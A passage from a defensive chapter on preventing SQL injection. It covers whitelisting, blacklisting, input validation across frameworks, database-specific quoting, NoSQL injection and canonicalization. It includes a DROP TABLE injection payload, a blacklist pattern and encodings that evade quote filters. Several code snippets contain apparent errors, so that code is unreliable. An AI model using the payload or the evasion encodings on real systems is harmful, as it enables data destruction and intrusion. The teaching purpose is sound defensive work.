\ncanonicalization in a separate solution later in this chapter.  \nWhitelisting  \nWhitelist validation is the practice of only accepting input that is known to be good. This can \ninvol ve validating compliance with the expected known values, type, length or size, numeric \nrange, or other format standards before accepting the input for further processing. For example, validating that an input value is a credit card number may involve validating that the input value contains only numbers, is between 13 and 16 digits long, and passes the business logic check of correctly passing the Luhn formula (the formula for calculating the validity of a number based on the last “check” digit of the card) . \nWhen using whitelist validation you should consider the following points:  \n• Known value:  Is the data something where there is a known list of valid values? Is the value \nprovided something that can be looked up to determine if it is correct?  \n• Data type:  Is the data type correct? If the value is supposed to be numeric, is it numeric? If it \nis supposed to be a positive number, is it a negative number instead?  \n• Data size:  If the data is a string, is it of the correct length? Is it less than the expected \nmaximum length? If it is a binary blob, is it less than the maximum expected size? If it is \nnumeric, is it of the correct size or accuracy? (For example, if an integer is expected, is the number that is passed too large to be an integer value?)  \n• Data range:  If the data is numeric, is it in the expected numeric range for this type of data?  \n• Data content:  Does the data look like the expected type of data? For example, does it satisfy \nthe expected properties of a ZIP Code if it is supposed to be a ZIP Code? Does it contain only the expected character set for the data type expected? If a name value is submitt ed, only \nsome punctuation (single quotes and character accents) would normally be expected, and other characters, such as the less than sign (<), would not be expected. \nA common method of implementing content validation is to use regular expressions. \nFollo wing is a simple example of a regular expression for validating a US ZIP Code contained \nin a string:  \n^\\d{5}(-\\d{4})?$  \nIn this case, the regular expression matches both five -digit and five -digit + four -digit ZIP \nCodes as follows:  \n• ^\\d{5} Match exactly five numeric digits at the start of the string.  \n• (–\\d{4})?  Match the dash character plus exactly four digits either once (present) or not at all \n(not present).  \n• $ This would appear at the end of the string. If there is additional content at the end of the \nstring, the regular expression will not match.  \nIn general, whitelist validation is more powerful of the two input validation approaches. It \ncan, however, be difficult to implement in scenarios where there is complex input, or where the \nfull set of possible i nputs cannot be easily determined. Difficult examples may include \napplications that are localized in languages with large character sets (e.g. Unicode character sets such as the various Chinese and Japanese character sets). It is recommended that you use whitelist validation wherever possible, and then supplement it by using other controls such as \noutput encoding to ensure that information that is then submitted elsewhere (such as to the database) is handled correctly.  \nKnown Value Validation  \nA powerful, but  often underused, way to validate input is to compare the input to a list of valid \nvalues and reject the input if it is not in the list. By comparing the value  against a list, we are in \nfull control over all the possible values and code paths the input may  take.  \nAs mentioned earlier when discussing parameterized statements, there are elements in SQL \nstatements that cannot be parameterized —specifically SQL identifiers and keywords. If we for \ninstance look at ordering a result set by a column, the name of the  column cannot be \nparameterized (it is a SQL identifier). What we could do though, instead of directly adding an unsanitized value from the user, is to make sure the value holds a valid column name. \nIf we wanted to do this when using MySQL, we could first run a statement retrieving all \ncolumn names for the table in question. We could do this using a \nSELECT  statement as explained \nin Chapter 4 , or we could use DESCRIBE : \ndescribe username  \nThis would return a list of valid columns including their data types and default values:  \n+----------+ -------------+ ------+-----+--------- +----------------+  \n| Field | Type | Null | Key | Default | Extra |  \n+----------+ -------------+ ------+-----+--------- +----------------+  \n| id | int(11) | NO | PRI | NULL | auto_increment |  \n| username | varchar(50) | YES | | NULL | |  \n| password | varchar(50) | YES | | NULL | |  \n+----------+ -------------+ ------+-----+--------- +----------------+  \nWe now have a list of all possible column names, and we are able to validate the value. In \norder to avoid making two queries every time, we can cache the result in the application.  \nIf we are building statements on the database, we can also use this concept there. Consider \nthe following Oracle example:  \nsqlstmt:= ‘SELECT ∗  FROM FOO WHERE VAR like ’‘% ’ || searchparam || ‘ %’’; \nsqlstmt:= sqlstmt || ‘ ORDER BY ’ || orderby || ‘ ’ || sortorder;  \n… \nopen c_data FOR sqlstmt;  \nThis is clearly not protected against SQL injection, as the searchparam , orderby  and sortorder  \nparameters could all be used to change the query. In the case of the searchparam  parameter, we \ncan parameterize this as discussed earlier in the chapter, however orderby  is a SQL identifier, \nand sortorder  is a SQL keyword. To avoid this problem w e can use functions on the database \nside that check if the supplied value is valid. The example functions below demonstrate \ndifferent types of known value validation. In the first example we validate the sortorder  \nparameter against the list of possible val ues using the Oracle decode()  command:  \nFUNCTION get_sort_order(in_sort_order VARCHAR2)  \n RETURN VARCHAR2  \nIS \n v_sort_order varchar2(10):= ‘ASC’;  \nBEGIN  \n IF in_sort_order IS NOT NULL THEN  \n  select decode(upper(in_sort_order),‘ASC’,‘ASC,’DESC’,‘DESC’,‘ASC’ INTO  v_sort_order  \n   from dual;  \n END IF;  \n return v_sort_order;  \nEND; \nIn the second example, we validate the supplied column name ( orderby ) by performing a \nlookup on columns in the table, and validating that the column name supplied is present in the \ntable:  \nFUNCTION get_order_by(in_table_name VARCHAR2, in_column_name VARCHAR2, \nin_default_column_name VARCHAR2)  \n RETURN VARCHAR2  \nIS \n v_count NUMBER;  \nBEGIN  \n SELECT COUNT(∗ ) INTO v_count  \n  FROM ALL_TAB_COLUMNS WHERE LOWER(COLUMN_NAME)=LOWER(in_column_name) and \nLOWER(TABLE_NAME)=LOWER(in_table_name);  \n IF v_count=0 THEN  \n  return in_default_column_name;  \n ELSE \n  return in_column_name;  \n END IF;  \n EXCEPTION WHEN OTHERS THEN  \n  return in_default_name;  \nEND; \nA subtype of known value validation is input indirection. Instead of accepting values \ndirectly from the client, the client is presented with a list of allowed values and submits the \nindex of the selected value. For example—in a banking application the user  could be presented \nwith a list of valid account numbers, but when submitting back the account number the browser would submit the index of the account number in the list. On the server side this index would then be looked up in the list and the real account number would be used to create the query. When building SQL statements we can thus trust the account number, as only valid values were available in the list. Be careful when taking this approach though —if the index is \nmanipulated this may have unanticipated effects on business logic and functionality . \nTools & traps… \nDesigning an Input Validation and Handling Strategy  \nInput validation is a valuable tool for securing an application. However, it should be only part of a defense -in-\ndepth strategy, with multiple layers of defense contributing to the application’s overall security. Here is an \nexample of an input validation a nd handling strategy utilizing some of the solutions presented in this chapter:  \n• Whitelist input validation used at the application input layer to validate all user input as it is accepted by the \napplication. The application allows only input that is in t he expected form.  \n• Whitelist input validation also performed at the client’s browser. This is done to avoid a round trip to the server \nin case the user enters data that is unacceptable. You cannot rely on this as a security control, as all data from \nthe u ser’s browser can be altered by an attacker.  \n• Blacklist and whitelist input validation present at a Web application firewall (WAF) layer (in the form of \nvulnerability “signatures” and “learned” behavior) to provide intrusion detection/prevention capabilities and \nmonitoring of application attacks.  \n• Parameterized statements used throughout the application to ensure that safe SQL execution is performed.  \n• Encoding used within the database to safely encode input when used in dynamic SQL.  \n• Data extracted from  the database appropriately encoded before it is used. For example, data being displayed in \nthe browser is encoded for cross -site scripting (XSS).  \nBlacklisting  \nBlacklisting is the practice of only rejecting input that is known to be bad. This commonly \ninvolves rejecting input that contains content that is specifically known to be malicious by looking through the content for a number of “known bad” characters, strings, or patterns. This approach is generally weaker than whitelist validation because the list of potentially bad characters is extremely large, and as such any list of bad content is likely to be large, slow to run through, incomplete, and difficult to keep up to date.  \nA common method of implementing a blacklist is also to use regular expressions, with a list \nof characters or strings to disallow, such as the following example:  \n‘|%|--|;|/\\∗|\\\\\\∗|_|\\[|@|xp_  \nIn general, you should not use blacklisting in isolation, and you should use whitelisting if \npossible. However, in scenarios where you cannot use whitelisting, blacklisting can still provide a useful partial control. In these scenarios, however, it is recommended that you use blacklisting in conjunction with output encoding to ensure that input passed elsewhere (e.g. to the database) is subject to an additional check to ensure that it is correctly handled to prevent SQL injection . \nDamage & defense…  \nWhat to Do When Input Fails Validation? \nSo, what do you do when input fails validation? There are two major approaches: recovering and continuing on, \nor failing the action and reporting an error. Each has its advantages and disadvantages:  \n• Recovering:  Recovering from an input validation failure implies that the input can be sanitized or fixed —that \nis, that the problem that caused the failure can be solved programmatically. This is generally more likely to be \npossible if you are taking a blacklisting approach for input validation, and it commonly takes the approach of \nremoving bad characters fro m the input. The major disadvantage of this approach is ensuring that the filtering \nor removal of values does actually sanitize the input, and doesn’t just mask the malicious input, which can still \nlead to SQL injection issues.  \n• Failing:  Failing the actio n entails generating a security error, and possibly redirecting to a generic error page \nindicating to the user that the application had a problem and cannot continue. This is generally the safer option, \nbut you should still be careful to make sure that no information regarding the specific error is presented to the \nuser, as this could be useful to an attacker to determine what is being validated for in the input. The major \ndisadvantage of this approach is that the user experience is interrupted and any tran saction in progress may be \nlost. You can mitigate this by additionally performing input validation at the client’s browser, to ensure that \ngenuine users should not submit invalid data, but you cannot rely on this as a control because a malicious user \ncan change what is ultimately submitted to the site.  \nWhichever approach you choose, ensure that you log that an input validation error has occurred in your \napplication logs. This could be a valuable resource for you to use to investigate an actual or attempted break -in to \nyour application.  \nValidating Input in Java  \nIn Java, input validation support is specific to the framework being used. To demonstrate input \nvalidation in Java, we will look at how a common framework for building Web applications in Java, Java Server Faces (JSFs), provides support for input validation. For this purpose, the best way to implement input validation is to define an input validation class that implements the \njavax.faces.validator.Validator  interface. Refer for the following code snippe t for an example \nof validating a username in JSF:  \npublic class UsernameValidator implements Validator {public void validate(FacesContext \nfacesContext, UIComponent uIComponent, Object value) throws ValidatorException  \n{ \n //Get supplied username and cast to a String  \n String username = (String)value;  \n //Set up regular expression  \n Pattern p = Pattern.compile(“^[a- zA-Z]{8,12}$”);  \n //Match username  \n Matcher m = p.matcher(username);  \n if (!matchFound) {FacesMessage message = new FacesMessage();  \n  message.setDetail(“Not valid –  it must be 8– 12 letter only”);  \n  message.setSummary(“Username not valid”);  \n  message.setSeverity(FacesMessage.SEVERITY_ERROR);  \n  throw new ValidatorException(message);  \n } \n} \nAnd the following will need to be added to the faces -config.xml file in  order to enable the \nabove validator:  \n<validator>  \n <validator -id>namespace.UsernameValidator</validator- id> \n <validator -class>namespace.package.UsernameValidator</validator- class>  \n</validator>  \nYou can then refer to this in the related JSP file as follows:  \n<h:inputText value=“username” id=“username” required=“true”><f:validator \nvalidatorId=“namespace.UsernameValidator” />  \n</h:inputText>  \nAn additional useful resource for implementing input validation in Java is the OWASP \nEnterprise Security API (ESAPI) that y ou can download at www.owasp.org/index.php/ESAPI . \nESAPI is a freely available reference implementation of security -related methods that you can \nuse to build a secure application. This includes an impleme ntation of an input validation class, \norg.owasp.esapi.reference.DefaultValidator , which you can use directly or as a reference \nimplementation for a custom input validation engine. \nValidating Input in .NET  \nASP.NET features a number of built -in controls that  you can use for input validation, the most \nuseful of which are the RegularExpressionValidator  control and the CustomValidator  control. \nUsing these controls with an ASP.NET application provides the additional benefit that client -\nside validation will also be performed, which will improve the user experience in case the user \ngenuinely enters erroneous input. The following code is an example of the use of \nRegularExpressionValidator  to validate that a username contains only letters (uppercase and \nlowercase) and is between 8 and 12 characters long:  \n<asp:textbox id=“userName” runat=“server”/>  \n<asp:RegularExpressionValidator id=“usernameRegEx” \nrunat=“server”ControlToValidate=“userName”  \nErrorMessage=“Username must contain 8– 12 letters only.”  \nValidationExpression=“^[a- zA-Z]{8,12}$” />  \nThe next code snippet is an example of the use of CustomValidator  to validate that a password \nis correctly f ormatted. In this case, you also need to create two user -defined functions: \nPwdValidate  on the server to perform validation on the password value, and ClientPwdValidate  in \nclient -side JavaScript or VBScript to validate the password value at the user’s brow ser: \n<asp:textbox id=“txtPassword” runat=“server”/>  \n<asp:CustomValidator runat=“server”ControlToValidate=“txtPassword”  \nClientValidationFunction=“ClientPwdValidate”  \nErrorMessage=“Password does not meet requirements.”  \nOnServerValidate=“PwdValidate” />  \nValida ting Input in PHP  \nAs PHP is not directly tied to a presentation layer, input validation support in PHP, as in Java, is specific to the framework in use. Because there is no presentation framework in PHP with overwhelming popularity, a large number of PHP a pplications implement input validation \ndirectly in their own code. \nYou can use a number of functions in PHP as the basic building blocks for building input \nvalidation, including the following:  \n• preg_match(regex, matchstring):  Do a regular expression match  with matchstring  using the \nregular expression regex . \n• is_<type>(input):  Check whether the input is <type> ; for example, is_numeric() . \n• strlen(input):  Check the length of the input. \nAn example of using preg_match  to validate a form parameter could be as follows:  \n$username = $_POST[‘username’];  \nif (!preg_match(“/^[a- zA-Z]{8,12}$/D”, $username) {  \n// handle failed validation  \n} \nValidating Input in Mobile Applications  \nAs mentioned data in mobile applications can either be stored on a remote server or locally in \nthe app. In both cases we want to validate the input locally, however for data stored remotely we also need to do input validation as a part of the remote service, as there is no guarantee that there is an actual mobile application at the other end. It could just as well be an attacker using a custom attack application.  \nThe in -device input validation can be done in two ways. We can either use a field type that \nonly supports the data type we expect. This could be a numeric field where only numbers can be entered. We can also subscribe to change events for the input fields, and handle invalid input as we receive it. Android supports the concept of input filters, where one or more implementations of \nInputFilter  are aut omatically applied to the data, and can reject invalid \ninput. \nValidating Input in HTML5  \nAs for mobile apps we also have to consider where data is stored when developing HTML5 applications. Data can be stored locally in the Web Browser Storage, or it can be  stored \nremotely on the Web server hosting the HTML5 Web application. We can validate data stored \nin the browser in JavaScript or by using the new types of input fields available to HTML5. \nThese input fields support the required -attribute instructing the b rowser to require that the field \nhas a value, and the pattern -attribute, which allows the developer to input a regular expression \nthe input must satisfy:  \n<input type=“text” required=“required” pattern=“^[0- 9]{4}” …  \nBut we have to remember that an attacker is able to manipulate the HTML, JavaScript and \ndata stored in the Web Browser Storage within his own browser. Thus if the application is sending data back to our server -side application, the server -side code must always revalidate \nthe input it receives fro m the HTML5 application.  \nEncoding output  \nIn addition to validating input received by the application, it is often necessary to also encode what is passed between different modules or parts of the application. In the context of SQL injection, this is applie d as requirements to encode, or “quote,”  content that is sent to the \ndatabase to ensure that it is not treated inappropriately. However, this is not the only situation in which encoding may be necessary.  \nAn often- unconsidered situation is encoding informat ion that comes from the database, \nespecially in cases where the data being consumed may not have been strictly validated or sanitized, or may come from a third -party source. In these cases, although not strictly related to \nSQL injection, it is advisable th at you consider implementing a similar encoding approach to \nprevent other security issues from being presented, such as XSS. \nEncoding to the Database  \nEven in situations where whitelist input validation is used, sometimes content may not be safe to send to the database, especially if it is to be used in dynamic SQL. For example, a last name such as O’Boyle is valid, and should be allowed through whitelist input validation. This name, however, could cause significant problems in situations where this input is  used to dynamically \ngenerate a SQL query, such as the following:  \nString sql = “INSERT INTO names VALUES (‘“ + fname + ”‘,‘“ + lname + ”’);”  \nAdditionally, malicious input into the first name field, such as:  \n’,’’); DROP TABLE names -- \nbe used to alter the SQ L executed to the following:  \nINSERT INTO names VALUES (’’,’’); DROP TABLE names--’,’’);  \nYou can prevent this situation through the use of parameterized statements, as covered \nearlier in this chapter. However, where it is not possible or desirable to use these, it will be \nnecessary to encode (or quote) the data sent to the database. This approach has a limitation, in that it is necessary to encode values every time they are used in a database query; if one encode is missed, the application may well be vulnerable to SQL injection.  \nEncoding for Oracle \nAs Oracle uses the single -quote character as the terminator for a string literal, it is necessary to \nencode the single quote when it is included in strings that will be included within dynamic \nSQL. In Oracle, you can do this by replacing the single quote with two single quotes. This will cause the si ngle quote to be treated as a part of the string literal, and not as a string terminator, \neffectively preventing a malicious user from being able to exploit SQL injection on that particular query. You can do this in Java via code that is similar to the fol lowing:  \nsql = sql.replace(“’”, “’’”);  \nFor example, the preceding code would cause the string O’Boyle to be quoted to the string \nO’’Boyle . If stored to the database, it will be stored as O’Boyle but will not cause string \ntermination issues while being manipulated while quoted. You should be careful when doing a string replacement in PL/SQL code, however. Because the single quote needs to be quoted in PL/SQL since it is a string terminator, you nee d to replace a single quote with two single \nquotes in PL/SQL via the slightly less straightforward replacement of one quote (presented by two single quotes) with two quotes (represented by four quotes) as follows:  \nsql = replace(sql, ’’’’, ’’’’’’);  \nwhich ma y be more logical and clearer to represent as character codes:  \nsql = replace(sql, CHR(39), CHR(39) || CHR(39));  \nFor other types of SQL functionality, it may also be necessary to quote information that is \nsubmitted in dynamic SQL, namely where using wildcar ds in a LIKE clause. Depending on the \napplication logic in place, it may be possible for an attacker to modify how the application \nlogic works by utilizing wildcards in user input that is later used in a LIKE clause. In Oracle, the \nwildcards in Table 8.2 are valid in a LIKE clause.  \nTable 8.2  Oracle LIKE  Wildcards  \nCharacter  Meanin g \n% Match zero or more of any characters  \n_ Match exactly one of any character  \nIn instances where user input includes one of the characters in Table 8.2, you can ensure that \nthey are treated correctly by defining an escape character for the query, preceding the wildcard \ncharacter with the escape character, and specifying the escape character in the query using an \nESCAPE  clause. Here is an example:  \nSELECT ∗ from users WHERE name LIKE ‘ a%’ \n--Vulnerable. Returns all users starting with ‘a’  \nSELECT ∗ from users WHERE name LIKE ‘ a\\%’ ESCAPE ‘\\’ \n--Not vulnerable. Returns user ‘a%’, if one exists  \nNote that when using the ESCAPE  clause, you can specify any single character to be used as \nthe escape character. I used the backslash in the preceding example because this is a common convention when escaping content.  \nAdditionally, on Oracle 10g Release 1 and later, there is one more method of quoting a \nstring —the “\nq” quote, which takes the form q‘[QUOTE CHAR]string[QUOTE CHAR]’ . The quote \ncharacter can be any single character that doesn’t occur in the string, wit h the exception that \nOracle expects matching brackets (i.e. if you’re using “ [“ as the opening quote character, it \nexpects the matching ” ]” as the closing quote character). The following are some examples of \nquoting strings in this way:  \nq’(5%)’  \nq’AO’BoyleA’  \nOracle dbms_assert  \nWith Oracle 10g Release 2, Oracle introduced a new package called dbms_assert. This \npackage was then back -ported to older database versions (until Oracle 8i). You should use \ndbms_assert to perform input validation if paramet erized queries (e.g. in FROM clauses) are not \npossible. dbms_assert offers seven different functions ( ENQUOTE_LITERAL , ENQUOTE_NAME , NOOP, \nQUALIFIED_SQL_NAME , SCHEMA_NAME , SIMPLE_SQL_NAME , and SQL_OBJECT_NAME ) to validate different \ntypes of input.  \nWarning  \nYou should not use the NOOP function, because the function does nothing and does not protect you from SQL \ninjection. Oracle uses this function internally to avoid false positives during automatic source code scanning.  \nYou can use the preceding functions as  shown in the following examples. The first code \nsnippet is an insecure query without dbms_assert (SQL injection in FIELD , OWNER , and TABLE ): \nexecute immediate ‘select ’|| FIELD ||‘from’|| OWNER ||‘.’|| TABLE;  \nHere is the same query, with input validation using dbms_assert:  \nexecute immediate ‘select ’||sys.dbms_assert.SIMPLE_SQL_NAME(FIELD) \n||‘from’||sys.dbms_assert.ENQUOTE_NAME  \n(sys.dbms_assert.SCHEMA_NAME(OWNER),FALSE)  \n||‘.’||sys.dbms_assert.QUALIFIED_SQL_NAME(TABLE);  \nTable 8.3 lists the various functions supported by dbms_assert. \nTable 8.3  dbms_assert Functions  \nFunction Descriptio n \nDBMS_ASSERT.SCHEMA_NAME  This function checks to see whether the passed string is an \nexisting object in the database  \nFunction Descriptio n \nDBMS_ASSERT.SIMPLE_SQL_NAME  This function checks that characters in an SQL element consist \nonly of A–Z, a–z, 0–9, $, #, and _. If the parameter is quoted with \ndouble quotes, everything with the exception of double quotes \nis allowed  \nDBMS_ASSERT.SQL_OBJECT_NAME  This function checks to see whether the passed string is an \nexisting object in the database  \nDBMS_ASSERT.SIMPLE_SQL_NAME  This function checks that characters in an SQL element consist \nonly of A–Z, a–z, 0–9, $, #, and _. If the parameter is quoted with \ndouble quotes, everything with the exception of double quotes is allowed  \nDBMS_ASSERT.QUALIFIED_SQL_NAME  This function is very similar to the SIMPLE_SQL_NAME  function but \nalso allows database links  \nDBMS_ASSERT.ENQUOTE_LITERAL  This function quotes the passed argument in double quotes. If the \nargument was already quoted, nothing will be done  \nDBMS_ASSERT.ENQUOTE_NAME  This function encloses the user -supplied string in single quotes if \nit has not already been done  \nOracle offers a detailed explanation on how to use dbms_assert in a tutorial on defending \nagainst SQL injection attacks ( http://st-\ncurriculum.oracle.com/tutorial/SQLInjection/index.htm ). To avoid attacks via modified public \nsynonyms you should always call the package via its fully qualified name.  \nEncoding for Microsoft SQL Server \nAs SQL Server also uses the single quote as the terminator for a string literal, it is necessary to \nencode the single quote when it is included in strings that will be included within dynamic SQL. In SQL Server, you can achieve this by replacing the single quote with two single \nquotes. This will cause the single quote to be treated as a part of the string literal, and not as a \nstring terminator, effectively preventing a malicious user from being able to exploit SQL injection on that particular query. You can do this in C# via code that is similar to the following:  \nsql = sql.Replace(“’”, “’’”);  \nFor example, the preceding code would cause the string O’Boyle to be quoted to the string \nO’’Boyle . If stored to the database, it will be stored as O’Boyle but will not cause string \ntermination issues while being manipulated while quoted. You should be careful when doing a string replacement in stored procedure Transact -SQL code, however. Because the single quote \nneeds to be quoted in Transact -SQL since it is a string terminator, you need to replace a single \nquote with two single quotes in Transact -SQL via the slightl y less straightforward replacement \nof one quote (presented by two single quotes) with two quotes (represented by four quotes) as follows:  \nSET @enc = replace(@input, ’’’’, ’’’’’’)  \nwhich may be more logical and clearer to represent as character codes:  \nSET @enc = replace(@input, CHAR(39), CHAR(39) + CHAR(39));  \nFor other types of SQL functionality, it may also be necessary to quote information that is \nsubmitted in dynamic SQL, namely where using wildcards in a LIKE clause. Depending on the \napplication logic in place, it may be possible for an attacker to subvert logic by supplying wildcards in the input that is later used in the \nLIKE clause. In SQL Server, the wildcards that are \nshown in Table 8.4 are valid in a LIKE clause.  \nTable 8.4  Microsoft SQL Server LIKE  Wildcards  \nCharacter  Meanin g \n% Match zero or more of any character  \n_ Match exactly one of any character  \nCharacter  Meanin g \n[ ] Any single character within the specified range [a–d] or set [abcd]  \n[^] Any single character not within the specified range [^a–d] or set [^abcd]  \nIn instances where you need to use one of these characters in a LIKE clause within dynamic \nSQL, you can quote the character with square brackets, []. Note that only the percentage ( %), \nunderscore ( _) and opening square bracket ( [) characters will need to be quoted; the closing \nsquare bracket ( ]), carat ( ^), and dash ( -) characters have special meaning only when they are \npreceded by an opening square bracket. You can do this as follows : \nsql = sql.Replace(“[”, “[[]”);  \nsql = sql.Replace(“%”, “[%]”);  \nsql = sql.Replace(“_”, “[_]”);  \nAdditionally, to prevent a match on one of the preceding characters, you can also define an \nescape character for the query, precede the wildcard character with t he escape character, and \nspecify the escape character in the query using an ESCAPE  clause. Here is an example:  \nSELECT ∗ from users WHERE name LIKE ‘ a%’ \n-- Vulnerable. Returns all users starting with ‘a’  \nSELECT ∗ from users WHERE name LIKE ‘ a\\%’ ESCAPE ‘\\’ \n-- Not vulnerable. Returns user ‘a%’, if one exists  \nNote that when using the ESCAPE  clause, you can specify any single character to be used as \nthe escape character. I used the backslash in this example because this is a common convention \nwhen escaping cont ent. \nTip \nWhen encoding single quotes as two single quotes in Transact -SQL (e.g. in a stored procedure), be careful to \nallocate enough storage to the destination string; generally twice the expected maximum size of the input plus one \nshould be sufficient. T his is because Microsoft SQL Server will truncate the value that is stored if it is too long, \nand this can lead to problems in dynamic SQL at the database level. Depending on the query logic in place, this \ncan lead to an SQL injection vulnerability that is  caused by the filtering you have in place to prevent it.  \nFor the same reason, it is recommended that you use replace()  rather than quotename()  to perform encoding, as \nquotename()  does not correctly handle strings longer than 128 characters.  \nEncoding for MySQL  \nMySQL Server also uses the single quote as a terminator for a string literal, so it is necessary \nto encode the single quote when it is included in strings that will be included within dynamic SQL. In MySQL, you can do this either by repl acing the single quote with two single quotes as \nwith other database systems, or by quoting the single quote with a backslash (\n\\). Either of \nthese will cause the single quote to be treated as a part of the string literal, and not as a string terminator, ef fectively preventing a malicious user from being able to exploit SQL injection on \nthat particular query. You can do this in Java via code that is similar to the following:  \nsql = sql.replace(“’”, “ \\’”); \nAdditionally, PHP provides the mysql_real_escape()  function, which will automatically quote \nthe single quote with a backslash, as well as quoting other potentially harmful characters such as 0x00 (\nNULL), newline ( \\n), carriage return ( \\r), double quotes ( “), backslash ( \\), and 0x1A \n(Ctrl+Z ): \nmysql_real_escape_string($user);  \nFor example, the preceding code would cause the string O’Boyle to be quoted to the string \nO\\’Boyle. If stored to the database, it will be stored as O’Boyle  but will not cause string \ntermination issues while being manipulated while quoted. Y ou should be careful when doing a \nstring replacement in stored procedure code, however. Because the single quote needs to be quoted since it is a string terminator, you need to replace a single quote with two single quotes in stored procedure code via the slightly less straightforward replacement of one quote (presented by a quoted single quote) with a quoted single quote (represented by a quoted backslash and a quoted single quote) as follows:  \nSET @sql = REPLACE(@sql, ‘\\ ’’, ‘\\\\\\’’) \nwhich may be more logica l and clearer to represent as character codes:  \nSET @enc = REPLACE(@input, CHAR(39), CHAR(92, 39));  \nFor other types of SQL functionality, it may also be necessary to quote information that is \nsubmitted in dynamic SQL, namely where using wildcards in a LIKE clause. Depending on the \napplication logic in place, it may be possible for an attacker to subvert logic by supplying \nwildcards in the input that is later used in the LIKE clause. In MySQL, the wildcards in Table \n8.5 are valid in a LIKE clause.  \nTable 8.5  MySQL LIKE  Wildcards  \nCharacter  Meanin g \n% Match zero or more of any characters  \n_ Match exactly one of any character  \nTo prevent a match on one of the characters shown in Table 8.5, you can escape the \nwildcard character with the backslash character ( \\). Here’s how to do this in Java:  \nsql = sql.replace(“%”, “ \\%”); \nsql = sql.replace(“_”, “ \\_”); \nEncoding for PostgreSQL  \nPostgreSQL also uses a single quote as a terminator fo r a string literal. The single quote can be \nencoded in two ways. You can either replace a single quote with two single quotes, like for Oracle or Microsoft SQL Server. In PHP that can be achieved by:  \n$encodedValue = str_replace(“’”, “’’”, $value);  \nAn alter native approach is to encode the single quote using a backslash, but PostgreSQL \nwill then also expect you to put an upper case E in front of the string literal like this:  \nSELECT ∗ FROM User WHERE LastName=E’ O\\’Boyle’  \nIn PHP the backslash encoding could be performed using add_slashes()  or str_replace() , but \nthese are not  the recommended approaches. The best approach for encoding strings for \nPostgreSQL in PHP is to use the pq_escape_string()  method:  \n$encodedValue = pg_escape_string($value);  \nThis function invokes libpq’s PQescapeString()  which replaces a single backslash with a \ndouble, and a single quote with two:  \n‘ → ’’ \n\\ → \\\\ \nAnother way to create string literals in PostgreSQL, is to use the $ character. This character \nallows the developer to use a tag -like f unctionality within the SQL statements. A string built \nusing this syntax could look like this:  \nSELECT ∗ FROM User WHERE LastName=$quote$O ’Boyle$quote$  \nIn this case we need to make sure to escape any $ character in the user input by using a \nbackslash:  \n$encodedValue = str_replace(“$”, “ \\\\$”, $value);  \nAvoiding NoSQL injection  \nNoSQL database systems differ greatly in their implementation and APIs. Common to many is \nthat most methods in the query APIs provide methods that clearly separate data from code. For example, when using MongoDB from PHP data is typically inserted using associative arrays:  \n$users->insert(array(“username”=> $username, “password” => $password))  \nand query could look something like this:  \n$user = $users ->findOne(array(“username” => $username))  \nBoth of these examples use a syntax that resembles parameterized statements. When using \nthese APIs, we avoid building the queries by string concatenation, thus avoiding injection attacks.  \nHowever there are APIs where we really need to pay attention. For mo re advanced queries, \nMongoDB allows the developer to submit a JavaScript function using the $where  keyword:  \n$collection- >find(array(“\\ $where” => “function() { return this.username.indexOf(‘$test’) > -\n1 }”));  \nAs we see, the JavaScript function is injectable. An attacker can escape the string within \nindexOf()  and alter the way the query works. To avoid this we would have to use JavaScript \nencoding. The safest approach would be to escape all non- alphanumeric characters using \nhexadecimal encoding of type \\xnn or Unicode encoding of type \\unnnn. \nWarning  \nTake special care when using APIs where queries are built by concatenating strings containing data and control. \nThey are most likely injectable in a similar manner as SQL injection. This is true for APIs using Js on, XML, \nXPath, LDAP and other query languages if encoding is not handled properly. Whenever you use such an API, \nidentify the contexts and how to encode for each of them.  \nDamage & defense…  \nEncoding from the Database  \nA common issue when using databases is the inherent trust of the data that is contained in the database. Data \ncontained within the database commonly is not subjected to rigorous input validation or sanitization before being \nstored in the database; or, it may have come from an external source—ei ther from another application within the \norganization or from a third -party source. An example behavior that can cause this is the use of parameterized \nstatements. Although parameterized statements are secure in that they prevent exploitation of SQL inject ion by \navoiding dynamic SQL, they are often used instead of validating the input; as a result, the data stored within the \ndatabase can contain malicious input from the user. In these cases, you must be careful when accessing the data in \nthe database to avo id SQL injection and other types of application security issues when the data is ultimately used \nor presented to the user.  \nOne example of an issue that commonly occurs when unsafe data is present in the database is XSS. However, \nSQL injection is also possi ble in this instance. We discussed this topic in more depth from an attacker’s point of \nview in Chapter 7 , in “Exploiting second -order injection.”  \nTherefore, you should always consider performing context -specific encod ing on the data you fetch from the \ndatabase. Examples would include encoding for XSS issues before presenting content to the user’s browser, as \nwell as encoding for SQL injection characters, as discussed in the previous section, before using database conte nt \nin dynamic SQL.  \nCanonicalization  \nA difficulty with input validation and output encoding is ensuring that the data being evaluated \nor transformed is in the format that will be interpreted as intended by the end user of that input. A common technique for evading input validation and output encoding controls is to encode the input before it is sent to the application in such a way that it is then decoded and interpreted to suit the attacker’s aims. For example, Table 8 .6 lists alternative ways to encode the single -\nquote character.  \nTable 8.6  Example Single -Quote Representations  \nRepresentation  Type of Encodin g \n%27 URL encoding  \n%2527  Double URL encoding \n%%317  Nested double URL encoding  \n%u0027  Unicode representation  \n%u02b9  Unicode representation  \n%ca%b9  Unicode representation  \n' HTML entity  \n' Decimal HTML entity  \nRepresentation  Type of Encodin g \n' Hexadecimal HTML entity  \n%26apos;  Mixed URL/HTML encoding  \nIn some cases, these are alternative encodings of the character ( %27 is the URL -encoded \nrepresentation of the single quote), and in other cases these are double -encoded on the \nassumption that the data will be explicitly decoded by the application ( %2527  when URL -\ndecoded will be %27 as shown in Table 8.6, as will %%317 ) or are various Unicode \nrepresentations, either valid or invalid. Not all of these representations will be interpreted as a \nsingle quote normally; in mos t cases, they will rely on certain conditions being in place (such \nas decoding at the application, application server, WAF, or Web server level), and therefore it will be very difficult to predict whether your application will interpret them this way.  \nFor these reasons, it is important to consider canonicalization as part of your input validation \napproach. Canonicalization is the process of reducing input to a standard or simple form. For the single -quote examples in T able 8.6, this would normally be a single -quote character (‘).  \nCanonicalization Approaches  \nSo, what alternatives for handling unusual input should you consider? One method, which is often the easiest to implement, is to reject all input that is not already  in a canonical format. \nFor example, you can reject all HTML - and URL -encoded input from being accepted by the \napplication. This is one of the most reliable methods in situations where you are not expecting encoded input. This is also the approach that is often adopted by default when you do whitelist input validation, as you may not accept unusual forms of characters when validating for known good input. At the very least, this could involve not accepting the characters used to encode data (such as \n%, &, and # from the examples in Table 8.6), and therefore not allowing these \ncharacters to be input.  \nIf rejecting input that can contain encoded forms is not possible, you need to look at ways to \ndecode or otherwise make safe the input that you receive. This may include several decoding steps, such as URL decoding and HTML decoding, 